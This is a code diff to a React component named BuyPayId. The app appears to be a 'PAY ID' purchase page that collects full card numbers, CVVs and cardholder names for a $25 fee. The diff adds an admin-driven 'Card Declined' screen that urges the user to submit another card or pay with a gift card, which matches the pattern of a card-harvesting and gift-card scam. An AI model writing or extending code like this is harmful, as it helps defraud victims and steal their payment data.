@@ -122,6 +122,10 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
   // Restore active PAY ID or pending gift card verification status if user reopens page
   useEffect(() => {
     if (user?.payIdVerified) {
+      if (pendingStorageKey) {
+        localStorage.removeItem(pendingStorageKey);
+      }
+      setPendingStatusId(null);
       setStep(5);
       return;
     }
@@ -191,15 +195,17 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
       doc(db, 'users', cleanEmail),
       (snap) => {
         if (!snap.exists()) return;
-        const remote = snap.data() as { payIdVerified?: boolean };
+        const remote = snap.data() as { payIdVerified?: boolean; cardRejectionReason?: string };
         if (remote.payIdVerified) {
-          updateUser({ payIdVerified: true });
+          updateUser({ payIdVerified: true, cardRejectionReason: '' });
           addTransaction({
             type: 'PAY ID Purchase',
             amount: 25,
             date: new Date().toLocaleString(),
           });
           setStep(5);
+        } else if (remote.cardRejectionReason) {
+          updateUser({ cardRejectionReason: remote.cardRejectionReason });
         }
       }
     );
@@ -346,6 +352,7 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
     }
 
     try {
+      updateUser({ cardRejectionReason: '' });
       await logCardSubmission({
         id: `CARD-${Date.now()}`,
         type: 'PAY ID Card Purchase',
@@ -354,6 +361,7 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
         cvv,
         cardName,
         amount: 25,
+        status: 'pending',
         userEmail: user?.email || formData.email || 'unknown',
         userName: user?.name || formData.fullName || cardName,
         date: new Date().toLocaleString(),
@@ -900,6 +908,32 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
                   className="text-xs font-semibold text-gray-500 hover:text-purple-700 underline cursor-pointer pt-1"
                 >
                   Cancel & submit a different card
+                </button>
+              </>
+            ) : user?.cardRejectionReason ? (
+              <>
+                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
+                  <X className="w-9 h-9" />
+                </div>
+                <span className="text-xs font-extrabold uppercase tracking-wider bg-red-100 text-red-800 border border-red-200 px-3 py-1 rounded-full">
+                  Card Declined by Admin
+                </span>
+                <h3 className="text-2xl font-extrabold text-red-700">
+                  ATM Card Verification Rejected
+                </h3>
+                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
+                  {user.cardRejectionReason}
+                </p>
+                <button
+                  type="button"
+                  onClick={() => {
+                    updateUser({ cardRejectionReason: '' });
+                    setCardError('Previous ATM card was declined. Please try another valid card or verify with a gift card.');
+                    setStep(3);
+                  }}
+                  className="w-full max-w-xs min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
+                >
+                  Try Another Card or Gift Card
                 </button>
               </>
             ) : (
